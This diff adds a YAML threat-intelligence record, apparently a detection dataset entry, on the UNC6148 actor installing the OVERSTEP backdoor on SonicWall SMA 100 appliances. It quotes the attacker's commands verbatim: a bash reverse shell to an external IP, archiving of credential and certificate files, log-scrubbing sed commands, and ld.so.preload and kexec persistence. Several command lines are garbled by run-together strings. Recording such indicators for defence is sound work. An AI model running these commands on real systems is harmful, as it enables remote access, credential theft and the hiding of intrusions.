@@ -1,0 +1,92 @@
+description: UNC6148 deployed the OVERSTEP backdoor on SonicWall SMA 100 appliances
+  via a reverse shell and persisted through ld.so.preload and rc.fwboot modifications.
+attribution: Google Threat Intelligence Group
+malware_families:
+- OVERSTEP
+processes:
+- httpd
+- kexec
+- bash
+- tar
+- sed
+- cp
+- mv
+- rm
+- chmod
+- chown
+- touch
+- gzip
+- sync
+- umount
+commandline:
+- '''bash'' ''-i'' ''&>'' ''/dev/tcp/193.149.180.50/4444'' ''0>&1'' ''&'''
+- '''tar'' ''czfP'' ''/usr/src/EasyAccess/www/htdocs/<filename>.tgz'' ''/tmp/temp.db''
+  ''/etc/EasyAccess/var/conf/persist.db'' ''/etc/EasyAccess/var/cert;'' ''chmod''
+  ''777'' ''/usr/src/EasyAccess/www/htdocs/<filename>.tgz'''
+- '''sed'' ''-i'' "''/dobackshell/d''" ''/var/log/httpd.log'''
+- '''sed'' ''-i'' "''/dopasswords/d''" ''/var/log/httpd.log'''
+- '''sed'' ''-i'' "''/dobackshell/d''" ''/var/log/http_request.log'''
+- '''sed'' ''-i'' "''/dopasswords/d''" ''/var/log/http_request.log'''
+- '''sed'' ''-i'' "''/dobackshell/d''" ''/var/log/inotify.log'''
+- '''sed'' ''-i'' "''/dopasswords/d''" ''/var/log/inotify.log'''
+- '''cp'' ''/cf/libsamba-errors.so.6'' ''$fwLoc/zzz/usr/lib/libsamba-errors.so.6'''
+- '''chown'' ''root:root'' ''$fwLoc/zzz/usr/lib/libsamba-errors.so.6'''
+- '''chmod'' ''777'' ''$fwLoc/zzz/usr/lib/libsamba-errors.so.6'''
+- '''touch'' ''-c'' ''$fwLoc/zzz/usr/lib/libsamba-errors.so.6'' ''-r$fwLoc/zzz/usr/lib/libsamba-errors.soecho''
+  ''/usr/lib/libsamba-errors.so.6'' ''>'' ''$fwLoc/zzz/etc/ld.so.preload'''
+- '''sync''; ''umount'' ''$fwLoc/zzz''; ''sync''; ''gzip'' ''$fwLoc/INITRD''; ''rm''
+  ''-rf'' ''$fwLoc/zzzmv $fwLoc/INITRD.gz $fwLoc/INITRD.GZ''; ''touch'' ''-c'' ''$fwLoc/INITRD.GZ''
+  ''-r$fwLoc/BZIMAGE/usr/local/sbin/kexec -l $fwLoc/BZIMAGE --initrd=$fwLoc/INITRD.GZ--append="`cat
+  $fwLoc/LINUX.OPT`"/usr/local/sbin/kexec -e'''
+scripting_engine:
+- '''bash'' ''-i'' ''&>'' ''/dev/tcp/193.149.180.50/4444'' ''0>&1'' ''&'''
+- '''tar'' ''czfP'' ''/usr/src/EasyAccess/www/htdocs/<filename>.tgz'' ''/tmp/temp.db''
+  ''/etc/EasyAccess/var/conf/persist.db'' ''/etc/EasyAccess/var/cert;'' ''chmod''
+  ''777'' ''/usr/src/EasyAccess/www/htdocs/<filename>.tgz'''
+- '''sed'' ''-i'' "''/dobackshell/d''" ''/var/log/httpd.log'''
+- '''sed'' ''-i'' "''/dopasswords/d''" ''/var/log/httpd.log'''
+image_load:
+- libsamba-errors.so.6
+network_connections:
+- process: httpd
+  destination_ip: 193.149.180.50
+  port: '4444'
+- process: kexec
+  destination_ip: ''
+  port: ''
+file_activity:
+- /cf/libsamba-errors.so.6
+- /usr/lib/libsamba-errors.so.6
+- /etc/ld.so.preload
+- /etc/rc.d/rc.fwboot
+- /cf/firmware/current/INITRD.GZ
+- /usr/src/EasyAccess/www/htdocs/<filename>.tgz
+persistence:
+- LD_PRELOAD via /etc/ld.so.preload
+- RC script modification in /etc/rc.d/rc.fwboot
+- INITRD image injection and kexec boot
+IOCs:
+- 193.149.180.50
+authors:
+- Josh Goddard
+- Zander Work
+- Dimiter Andonov
+- Google Threat Intelligence Group
+TTPs:
+  processes: []
+  commandline: []
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_activity: []
+  persistence: []
+  process_relations: []
+authors:
+- Josh Goddard
+- Zander Work
+- Dimiter Andonov
+reference: https://cloud.google.com/blog/topics/threat-intelligence/sonicwall-secure-mobile-access-exploitation-overstep-backdoor
+date_of_publication: June 03, 2025
+file_creation_date: August 22, 2025
